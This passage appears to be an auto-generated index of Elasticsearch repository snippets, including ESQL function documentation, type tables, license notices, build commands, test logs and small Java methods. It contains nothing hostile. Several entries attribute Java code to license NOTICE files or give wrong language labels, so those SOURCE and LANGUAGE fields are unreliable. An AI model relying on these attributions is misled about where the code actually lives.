NAME=graphql\"\n```\n\n----------------------------------------\n\nTITLE: Deleting Snapshots in Elasticsearch Repository\nDESCRIPTION: This method deletes a list of snapshots from an Elasticsearch repository. It uses the DeleteSnapshotRequest to perform the deletion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/slf4j-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nprivate void deleteSnapshots(String repoName, List<SnapshotId> snapshotIds, ActionListener<AcknowledgedResponse> listener) {\n        DeleteSnapshotRequest deleteSnapshotRequest = new DeleteSnapshotRequest(repoName);\n        deleteSnapshotRequest.snapshots(snapshotIds.stream().map(SnapshotId::getName).toArray(String[]::new));\n        client.admin().cluster().deleteSnapshot(deleteSnapshotRequest, listener);\n    }\n```\n\n----------------------------------------\n\nTITLE: Function Example Annotation in Java\nDESCRIPTION: Shows how to annotate Java function files with @FunctionInfo to automatically generate documentation examples\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/qa/testFixtures/src/main/resources/README.md#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n@FunctionInfo(\n    returnType = \"double\",\n    description = \"Returns ths {wikipedia}/Sine_and_cosine[Sine] trigonometric function of an angle.\",\n    examples = @Example(file = \"floats\", tag = \"sin\")\n)\n```\n\n----------------------------------------\n\nTITLE: IP Function Parameters Definition in Markdown\nDESCRIPTION: Documents the required parameters for IP function testing: an IP address parameter supporting both IPv4/IPv6, and a CIDR block parameter for testing IP address matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/cidr_match.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`ip`\n:   IP address of type `ip` (both IPv4 and IPv6 are supported).\n\n`blockX`\n:   CIDR block to test the IP against.\n```\n\n----------------------------------------\n\nTITLE: ESQL CONCAT Function Documentation Header\nDESCRIPTION: The header of the documentation file for the CONCAT function, indicating that it is auto-generated by AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/concat.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Unicode Copyright and License Notice in UnicodeUtil.java\nDESCRIPTION: Copyright notice and license terms for Unicode conversion code used in Lucene's UnicodeUtil implementation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-smartcn/licenses/lucene-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright 2001-2004 Unicode, Inc.\n * \n * Disclaimer\n * \n * This source code is provided as is by Unicode, Inc. No claims are\n * made as to fitness for any particular purpose. No warranties of any\n * kind are expressed or implied. The recipient agrees to determine\n * applicability of information provided. If this file has been\n * purchased on magnetic or optical media from Unicode, Inc., the\n * sole remedy for any claim will be exchange of defective media\n * within 90 days of receipt.\n * \n * Limitations on Rights to Redistribute This Code\n * \n * Unicode, Inc. hereby grants the right to freely use the information\n * supplied in this file in the creation of products supporting the\n * Unicode Standard, and to make copies of this file in any form\n * for internal or external distribution as long as this notice\n * remains attached.\n */\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Documentation\nDESCRIPTION: Documentation comment for an ESQL mathematical function that computes e raised to a given power. This is an auto-generated documentation file that should not be edited directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/exp.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the value of e raised to the power of the given number.\n```\n\n----------------------------------------\n\nTITLE: Defining GeoShape Class for SQL Scripting in Java\nDESCRIPTION: This snippet defines the GeoShape class from the org.elasticsearch.xpack.sql.expression.literal.geo package for use in SQL scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/main/resources/org/elasticsearch/xpack/sql/plugin/sql_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.sql.expression.literal.geo.GeoShape {\n}\n```\n\n----------------------------------------\n\nTITLE: Markdown Header for TO_TIMEDURATION Function\nDESCRIPTION: Defines the header for the TO_TIMEDURATION function documentation, including a link reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_timeduration.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n## `TO_TIMEDURATION` [esql-to_timeduration]\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Field Types and Result Types in Elasticsearch\nDESCRIPTION: A markdown table showing various field types supported in Elasticsearch and their corresponding result types. All field types listed map to the 'keyword' result type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_string.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | keyword |\n| cartesian_point | keyword |\n| cartesian_shape | keyword |\n| date | keyword |\n| date_nanos | keyword |\n| double | keyword |\n| geo_point | keyword |\n| geo_shape | keyword |\n| integer | keyword |\n| ip | keyword |\n| keyword | keyword |\n| long | keyword |\n| text | keyword |\n| unsigned_long | keyword |\n| version | keyword |\n```\n\n----------------------------------------\n\nTITLE: Generating ESQL Function Test Cases\nDESCRIPTION: This SQL-like code snippet represents a comment in an automatically generated test case file for ESQL functions. It provides instructions not to edit the file directly and refers to a README for regeneration instructions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/now.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: ESQL Long Type Conversion Comment\nDESCRIPTION: Generated comment header for ESQL's AbstractFunctionTestCase, indicating the file is auto-generated and should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_long.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Documentation Comment for ROUND Function\nDESCRIPTION: Header comment indicating that this is auto-generated documentation for ESQL's ROUND function, with a warning not to edit directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/round.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Generating Function Documentation with Gradle\nDESCRIPTION: Commands to regenerate documentation for specific ESQL functions or all functions using Gradle test execution\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/README.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew :x-pack:plugin:esql:test -Dtests.class='CaseTests'\n```\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew :x-pack:plugin:esql:test\n```\n\n----------------------------------------\n\nTITLE: Type Support Matrix for Date Operations in ESQL\nDESCRIPTION: A markdown table showing supported type combinations for date operations in ESQL. Documents how date_period and time_duration intervals interact with date and date_nanos types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/date_trunc.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| interval | date | result |\n| --- | --- | --- |\n| date_period | date | date |\n| date_period | date_nanos | date_nanos |\n| time_duration | date | date |\n| time_duration | date_nanos | date_nanos |\n```\n\n----------------------------------------\n\nTITLE: Verifying complete multi-architecture Docker buildx support\nDESCRIPTION: Shows the Docker buildx output after successfully adding support for multiple architectures including ARM64, demonstrating full platform compatibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/docker/README.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ docker buildx ls\nNAME/NODE DRIVER/ENDPOINT STATUS  BUILDKIT PLATFORMS\ndefault * docker\n  default default         running 20.10.21 linux/amd64, linux/arm64, linux/riscv64, linux/ppc64le, linux/s390x, linux/386, linux/arm/v7, linux/arm/v6\n```\n\n----------------------------------------\n\nTITLE: Dropwizard Copyright Notice\nDESCRIPTION: Copyright and attribution notice for Dropwizard software, acknowledging original developers Coda Hale and Yammer, Inc. as well as the Dropwizard Team\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/metrics-core-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nDropwizard\nCopyright 2010-2013 Coda Hale and Yammer, Inc., 2014-2016 Dropwizard Team\n\nThis product includes software developed by Coda Hale and Yammer, Inc.\n```\n\n----------------------------------------\n\nTITLE: Logging VectorScorerFactoryTests Random Tests in Elasticsearch\nDESCRIPTION: This log snippet shows the execution of random tests in VectorScorerFactoryTests. It includes environment information (JDK version, OS, architecture) and test-specific details such as chunk sizes and vector similarity functions being tested.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_18\n\nLANGUAGE: log\nCODE:\n```\n[2024-12-23T04:52:41,783][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomMin] JDK=23, os=Mac OS X, arch=aarch64\n[2024-12-23T04:52:41,785][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomMin] before test\n[2024-12-23T04:52:41,786][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomMin] Testing testRandom-279\n[2024-12-23T04:52:41,799][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomMin] after test\n\n// ... (other test outputs)\n\n[2024-12-23T04:52:42,034][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomScorerChunkSizeSmall] maxChunkSize=76\n[2024-12-23T04:52:42,035][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomScorerChunkSizeSmall] Testing testRandom-COSINE-2044.vex\n[2024-12-23T04:52:42,061][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomScorerChunkSizeSmall] Testing testRandom-DOT_PRODUCT-159.vex\n[2024-12-23T04:52:42,063][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomScorerChunkSizeSmall] Testing testRandom-EUCLIDEAN-455.vex\n[2024-12-23T04:52:42,069][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomScorerChunkSizeSmall] Testing testRandom-MAXIMUM_INNER_PRODUCT-1088.vex\n```\n\n----------------------------------------\n\nTITLE: Opening Elasticsearch Configuration File\nDESCRIPTION: Opens the Elasticsearch configuration file for editing to add the GCE discovery settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\nsudo vi /etc/elasticsearch/elasticsearch.yml\n```\n\n----------------------------------------\n\nTITLE: Basic GNU GPL Copyright Notice Template\nDESCRIPTION: Template for a standard GPL copyright notice to be placed at the start of source files. Includes program description, copyright declaration, and license terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-text-module-NOTICE.txt#2025-04-22_snippet_3\n\nLANGUAGE: plaintext\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Deprecated Java API Signatures List\nDESCRIPTION: Comprehensive list of deprecated Java API signatures including classes, methods, and fields from various Java packages including awt, io, lang, and applet. Each entry represents a specific API element that has been marked as deprecated in Java 17.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-deprecated.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\njava.applet.Applet\njava.applet.AppletContext\njava.applet.AppletStub\njava.applet.AudioClip\njava.awt.AWTEvent#<init>(java.awt.Event)\n# Additional signatures omitted for brevity...\n```\n\n----------------------------------------\n\nTITLE: Including BUCKET Function Examples in Markdown\nDESCRIPTION: This snippet includes the examples section for the BUCKET function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/bucket.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/bucket.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Moman/Finenight FSA Copyright Notice\nDESCRIPTION: Copyright notice for the levenshtein automata tables generated using moman/finenight FSA package\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-phonetic/licenses/lucene-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# Copyright (c) 2010, Jean-Philippe Barrette-LaPierre, <jpb@rrette.com>\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation\n# files (the \"Software\"), to deal in the Software without\n# restriction, including without limitation the rights to use,\n# copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the\n# Software is furnished to do so, subject to the following\n# conditions:\n#\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n```\n\n----------------------------------------\n\nTITLE: Basic Copyright Notice Template\nDESCRIPTION: Template for the minimal copyright and license notice to be included at the start of source files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-langdetect-NOTICE.txt#2025-04-22_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Standardizing Network Address Formatting\nDESCRIPTION: Requires the use of NetworkAddress format() method for consistent IP address formatting instead of default toString methods.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_8\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage use NetworkAddress format() to print IP or IP+ports\njava.net.InetAddress#toString()\njava.net.InetAddress#getHostAddress()\njava.net.Inet4Address#getHostAddress()\njava.net.Inet6Address#getHostAddress()\njava.net.InetSocketAddress#toString()\n```\n\n----------------------------------------\n\nTITLE: Deprecated Java API References\nDESCRIPTION: Collection of deprecated Java API references spanning multiple packages including java.security, java.sql, java.util, javax.management and related packages. These APIs are marked for removal in future Java versions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-deprecated.txt#2025-04-21_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\njava.security.Policy$Parameters\njava.security.PolicySpi\njava.security.PrivateKey#serialVersionUID\njava.security.Provider#<init>(java.lang.String,double,java.lang.String)\njava.security.Provider#getVersion()\njava.security.PublicKey#serialVersionUID\n// ... additional deprecated APIs\n```\n\n----------------------------------------\n\nTITLE: Generating Supported Types Table in Markdown\nDESCRIPTION: This code snippet creates a markdown table that lists the supported field types and their corresponding result types for ESQL functions. It includes various data types such as boolean, date, numeric types, geometric types, and others.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/values.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| cartesian_point | cartesian_point |\n| cartesian_shape | cartesian_shape |\n| date | date |\n| date_nanos | date_nanos |\n| double | double |\n| geo_point | geo_point |\n| geo_shape | geo_shape |\n| integer | integer |\n| ip | ip |\n| keyword | keyword |\n| long | long |\n| text | keyword |\n| version | version |\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Build Environment Configuration\nDESCRIPTION: Build environment details showing Gradle version, OS information, JDK version, and build configuration parameters including FIPS mode and random testing seed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_15\n\nLANGUAGE: text\nCODE:\n```\nElasticsearch Build Hamster says Hello!\n  Gradle Version        : 8.11.1\n  OS Info               : Mac OS X 15.2 (aarch64)\n  JDK Version           : 21.0.5+9-LTS-239 (Oracle)\n  JAVA_HOME             : /Users/rene/.sdkman/candidates/java/21.0.5-oracle\n  Random Testing Seed   : 7B469FBE8B6D0C65\n  In FIPS 140 mode      : false\n```\n\n----------------------------------------\n\nTITLE: Documenting Query Parameters for Elasticsearch ESQL Function Test\nDESCRIPTION: This snippet defines two key parameters for an Elasticsearch query: 'field' and 'query'. The 'field' parameter specifies the target field for the query, while the 'query' parameter defines the term to search for within that field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/term.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Field that the query will target.\n\n`query`\n:   Term you wish to find in the provided field.\n```\n\n----------------------------------------\n\nTITLE: Removing Azure Classic Discovery Plugin from Elasticsearch\nDESCRIPTION: Command to remove the Azure Classic Discovery plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove discovery-azure-classic\n```\n\n----------------------------------------\n\nTITLE: ST_XMAX Function Documentation Structure\nDESCRIPTION: Core documentation structure for the ST_XMAX spatial function, including section references for syntax, parameters, description, types and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_xmax.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n### `ST_XMAX` [esql-st_xmax]\n\n**Syntax**\n\n:::{image} ../../../images/functions/st_xmax.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/st_xmax.md\n:::\n\n:::{include} ../description/st_xmax.md\n:::\n\n:::{include} ../types/st_xmax.md\n:::\n\n:::{include} ../examples/st_xmax.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Data Paths for Unix-like Systems (Deprecated)\nDESCRIPTION: Demonstrates how to set multiple data paths for Elasticsearch on Unix-like systems. This feature is deprecated as of version 7.13.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/path.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\npath:\n  data:\n    - /mnt/elasticsearch_1\n    - /mnt/elasticsearch_2\n    - /mnt/elasticsearch_3\n```\n\n----------------------------------------\n\nTITLE: Apache License Boilerplate Notice\nDESCRIPTION: This snippet provides the boilerplate notice for applying the Apache License to your work. The user needs to replace the bracketed fields, [yyyy] and [name of copyright owner], with their specific information. The notice should be placed within the appropriate comment syntax for the specific file format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/google-api-client-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n\"Copyright [yyyy] [name of copyright owner]\\n\\n   Licensed under the Apache License, Version 2.0 (the \\\"License\\\");\\n   you may not use this file except in compliance with the License.\\n   You may obtain a copy of the License at\\n\\n       http://www.apache.org/licenses/LICENSE-2.0\\n\\n   Unless required by applicable law or agreed to in writing, software\\n   distributed under the License is distributed on an \\\"AS IS\\\" BASIS,\\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\n   See the License for the specific language governing permissions and\\n   limitations under the License.\"\n```\n\n----------------------------------------\n\nTITLE: Markdown Comment for Generated Content\nDESCRIPTION: A comment indicating that this content is auto-generated by ESQL's AbstractFunctionTestCase and should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_timeduration.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: TestAccumulator Class Implementation in Java\nDESCRIPTION: A utility class that accumulates test failures allowing tests to continue executing after encountering errors. It supports failure tracking, nested accumulators, and generating comprehensive error messages with details about all encountered failures.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-auth-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic class TestAccumulator implements AutoCloseable {\n    private final List<String> errors = new ArrayList<>();\n    private final TestAccumulator parent;\n    private final String errorPrefix;\n\n    public TestAccumulator() {\n        this(null, \"\");\n    }\n\n    private TestAccumulator(TestAccumulator parent, String errorPrefix) {\n        this.parent = parent;\n        this.errorPrefix = errorPrefix;\n    }\n\n    /**\n     * Creates a new accumulator that inherits from this one.\n     */\n    public TestAccumulator child(String prefix) {\n        return new TestAccumulator(this, prefix);\n    }\n\n    /**\n     * Adds a new error to the list of errors. Adds the {@link #errorPrefix},\n     * if there is one.\n     */\n    public void error(String error) {\n        errors.add(errorPrefix.isEmpty() ? error : errorPrefix + error);\n    }\n\n    /**\n     * Does this accumulator or any of its ancestors contain any errors?\n     */\n    public boolean hasErrors() {\n        return false == errors.isEmpty() || (null != parent && parent.hasErrors());\n    }\n\n    /**\n     * Is this accumulator free of errors? What about its ancestors?\n     */\n    public boolean ok() {\n        return false == hasErrors();\n    }\n\n    /**\n     * The errors that this accumulator contains. Doesn't include errors from\n     * the ancestors.\n     */\n    public List<String> errors() {\n        return Collections.unmodifiableList(errors);\n    }\n\n    /**\n     * Raises an {@link AssertionError} if there are any errors in this\n     * accumulator or any of its ancestors. Otherwise this is a no-op.\n     */\n    @Override\n    public void close() {\n        if (ok()) {\n            return;\n        }\n        if (null != parent) {\n            errors().forEach(e -> parent.error(e));\n            return;\n        }\n        throw new AssertionError(\"Accumulated errors:\\n\" + errors.stream().map(e -> \"  \" + e).collect(Collectors.joining(\"\\n\")));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Including Examples for CATEGORIZE Function in Markdown\nDESCRIPTION: Markdown code to include usage examples for the CATEGORIZE function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/categorize.md#2025-04-21_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/categorize.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Handling license status responses in Elasticsearch using Java\nDESCRIPTION: This method processes license status responses, determining if a license supports a specific feature. It handles both plain license responses and those with nested license information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/gson-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n@SuppressWarnings(\"unchecked\")\npublic static Map<String, Object> getFeatureStatus(Map<String, Object> response, String feature) {\n    if (response == null) {\n        return null;\n    }\n    if (response.containsKey(\"license\") == false) {\n        return (Map<String, Object>) response.get(feature);\n    }\n    if (response.containsKey(\"features\") == false) {\n        return null;\n    }\n    Map<String, Object> features = (Map<String, Object>) response.get(\"features\");\n    return (Map<String, Object>) features.get(feature);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Core Library\nDESCRIPTION: Evaluates the build file for the ':libs:core' project in the Elasticsearch codebase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_6\n\nLANGUAGE: gradle\nCODE:\n```\n> Configure project :libs:core\nEvaluating project ':libs:core' using build file '/Users/rene/dev/elastic/elasticsearch/libs/core/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Inbound Network Entitlement Example\nDESCRIPTION: Configuration for the deprecated inbound network access entitlement.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\norg.example.module: # or 'ALL-UNNAMED' if the plugin is non-modular\n  - inbound_network\n```\n\n----------------------------------------\n\nTITLE: ESQL Data Type Support Matrix Table\nDESCRIPTION: Markdown table showing mapping between field types and their parameter/result types. Each row defines field type, start parameter type, end parameter type, and result type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_slice.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | start | end | result |\n| --- | --- | --- | --- |\n| boolean | integer | integer | boolean |\n| cartesian_point | integer | integer | cartesian_point |\n| cartesian_shape | integer | integer | cartesian_shape |\n| date | integer | integer | date |\n| date_nanos | integer | integer | date_nanos |\n| double | integer | integer | double |\n| geo_point | integer | integer | geo_point |\n| geo_shape | integer | integer | geo_shape |\n| integer | integer | integer | integer |\n| ip | integer | integer | ip |\n| keyword | integer | integer | keyword |\n| long | integer | integer | long |\n| text | integer | integer | keyword |\n| unsigned_long | integer | integer | unsigned_long |\n| version | integer | integer | version |\n```\n\n----------------------------------------\n\nTITLE: Initializing Logger in Java for Elasticsearch\nDESCRIPTION: Shows how to initialize a Logger instance for a class in Elasticsearch using Log4J.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_9\n\nLANGUAGE: java\nCODE:\n```\nclass Foo {\n    private static final Logger logger = LogManager.getLogger(Foo.class);\n}\n```\n\n----------------------------------------\n\nTITLE: Debugging Queries with EQL Correctness Tests\nDESCRIPTION: These commands enable a debug mode during the EQL correctness tests, useful for verifying subquery results in sequence queries. The debug mode is enabled by using the parameter `-Dtests.eql_correctness_debug=true`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew -p x-pack/plugin/eql/qa/correctness check -Dtests.eql_correctness_debug=true\n```\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew ':x-pack:plugin:eql:qa:correctness:javaRestTest' --tests \"org.elasticsearch.xpack.eql.EsEQLCorrectnessIT.test {<queryNo>}\" -Dtests.eql_correctness_debug=true\n```\n\n----------------------------------------\n\nTITLE: Interactive Program GPL Notice Example\nDESCRIPTION: A template for the short notice that interactive programs should display when started in interactive mode. It includes copyright information and references to commands that show warranty and redistribution details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-NOTICE.txt#2025-04-21_snippet_5\n\nLANGUAGE: plaintext\nCODE:\n```\n    Gnomovision version 69, Copyright (C) year name of author\n    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n    `show w'. This is free software, and you are welcome to redistribute\n    it under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Deprecation of Entire API in Elasticsearch Specification\nDESCRIPTION: This JSON demonstrates how to document the deprecation of an entire API within the Elasticsearch specification, including payload fields such as version and explanation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/rest-api-spec/README.markdown#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"api\" : {\n    \"deprecated\" : {\n      \"version\" : \"7.0.0\",\n      \"description\" : \"Reason API is being deprecated\"\n    },\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: Standard template text for applying the Apache License 2.0 to software projects. This notice should be included at the top of source files with the bracketed fields replaced with project-specific information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/commons-codec-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n   Copyright [yyyy] [name of copyright 